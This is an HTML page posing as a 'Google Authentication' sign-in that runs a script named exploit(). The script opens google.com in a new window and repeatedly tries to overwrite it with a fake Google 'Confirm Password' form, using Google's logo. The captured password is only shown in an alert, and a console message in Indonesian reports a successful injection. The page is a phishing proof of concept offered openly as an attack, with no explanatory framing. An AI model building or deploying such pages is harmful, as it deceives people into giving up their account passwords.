<!DOCTYPE html>
<html>

<head>
    <title>Google Authentication</title>
    <style>
        body {
            font-family: sans-serif;
            text-align: center;
            padding-top: 100px;
        }

        .btn {
            padding: 15px 30px;
            background: #4285f4;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
    </style>
</head>

<body>

    <button class="btn" onclick="exploit()">Sign in with Google</button>

    <script>
        function exploit() {
            let win = window.open("https://www.google.com/", "_blank");
            let attempts = 0;
            let hackInterval = setInterval(() => {
                attempts++;
                try {
                    win.document.write(`
              <html>
              <body style="text-align:center;font-family:arial;">
                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
                <h2>Confirm Password</h2>
                <input type="password" id="p" placeholder="Password" style="width:200px;padding:10px;"><br><br>
                <button onclick="alert(document.getElementById('p').value)" style="background:#1a73e8;color:white;border:none;padding:10px 20px;">Next</button>
              </body>
              </html>
            `);
                    win.document.close();
                    clearInterval(hackInterval);
                    console.log("Injeksi tembus pada attempt ke-" + attempts);
                } catch (e) {
                    if (attempts > 100) clearInterval(hackInterval);
                }
            }, 5);
        }
    </script>
</body>

</html>
